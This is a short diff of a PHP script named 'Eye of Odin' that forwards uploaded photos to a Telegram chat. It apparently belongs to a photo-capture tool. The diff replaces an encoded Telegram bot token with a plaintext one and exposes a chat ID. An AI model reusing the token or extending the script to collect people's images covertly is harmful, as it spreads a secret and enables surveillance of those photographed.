@@ -1,6 +1,6 @@
 <?php
 // --- CONFIGURACIÓN DE EYE OF ODIN ---
-$token = "ODQ1ODUyMjgzMTpBQUVWUVBTSkpkZlpyVUJMZGNOOUlmcDZGeVlZZWtEM093OA==";
+$token = "8458522831:AAFJYojPhZ3WJJ8v-7jmyjGQAUnCYQAP_7M";
 $chat_id = "5639483306";    // Sustituye por tu ID
 
 // Función para enviar mensajes a Telegram
@@ -48,4 +48,5 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['photo'])) {
     enviarTelegram("sendPhoto", $datos_foto, $token);
     echo json_encode(['status' => 'success']);
 }
+
 ?>
